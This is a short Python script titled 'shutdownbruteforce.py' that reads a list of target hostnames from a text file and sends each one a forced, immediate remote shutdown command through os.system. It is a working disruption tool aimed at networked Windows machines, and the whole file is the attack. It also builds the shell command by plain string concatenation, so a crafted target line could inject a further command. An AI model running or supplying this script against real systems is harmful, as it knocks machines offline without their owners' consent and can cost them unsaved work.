#
# shutdownbruteforce.py - idchoppers
#
# Reads targets from a txt file and runs a shutdown command on each target

import os

with open(r"%USERPROFILE%\Documents\targets.txt", "r") as f:
    for i in f:
        target = str(i.strip())
        os.system("start /b shutdown /m "+target+" /s /t 0")
